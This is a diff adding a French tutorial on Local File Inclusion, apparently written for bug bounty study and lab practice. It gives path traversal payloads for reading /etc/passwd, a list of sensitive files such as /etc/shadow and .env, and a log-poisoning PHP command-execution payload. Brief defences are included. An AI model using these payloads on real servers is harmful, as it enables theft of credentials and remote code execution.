@@ -1,0 +1,101 @@
+# 🌐 Local File Inclusion (LFI)
+
+## C'est quoi le LFI ?
+
+Le LFI permet de lire des fichiers locaux
+sur le serveur web à travers le navigateur !
+
+## Comment ça marche ?
+
+Un site charge ses pages comme ça :
+```
+http://site.com/?page=accueil.php
+http://site.com/?page=contact.php
+```
+
+Si on injecte :
+```
+http://site.com/?page=../../../etc/passwd
+```
+
+Le serveur lit et affiche `/etc/passwd` ! 😏
+
+## Le Path Traversal
+
+```
+../  → remonter d'un niveau dans les dossiers
+
+/var/www/html/page.php
+        ↓
+../   → /var/www/html/
+../../ → /var/www/
+../../../ → /var/
+../../../.. → /
+```
+
+## Fichiers intéressants à lire
+
+```
+/etc/passwd          → liste des utilisateurs
+/etc/shadow          → hashes des mots de passe
+/etc/hosts           → configuration réseau
+/etc/crontab         → tâches planifiées
+/proc/self/environ   → variables d'environnement
+/var/log/apache2/access.log → logs serveur web
+/var/www/html/config.php    → identifiants DB 😏
+/var/www/html/.env          → clés API, mots de passe 😏
+wp-config.php               → config WordPress 😏
+```
+
+## Conditions pour LFI
+
+```
+Le site utilise un paramètre pour charger des fichiers
+        ↓
+Le serveur filtre pas le path traversal
+        ↓
+L'utilisateur Apache a accès au fichier
+        ↓
+LFI réussit ! 😏
+```
+
+## LFI → RCE
+
+LFI peut mener à une exécution de code !
+
+```
+Injecter du PHP dans les logs Apache :
+GET /<?php system($_GET['cmd']); ?> HTTP/1.1
+        ↓
+Lire les logs via LFI :
+?page=../../../var/log/apache2/access.log&cmd=whoami
+        ↓
+Le PHP s'exécute → RCE ! 😏
+```
+
+## Protection contre le LFI
+
+```
+Valider et filtrer les inputs
+Désactiver allow_url_include
+Utiliser une whitelist de fichiers autorisés
+Pas de messages d'erreur détaillés
+```
+
+## Sévérité en bug bounty
+
+```
+LFI fichiers sensibles → High 🔴
+LFI → RCE             → Critical 🔴🔴
+```
+
+## Pratique
+
+```
+Mutillidae → OWASP Top 10 → A4 → Source Viewer
+PortSwigger → Web Security Academy → File Path Traversal
+```
+```
+
+---
+
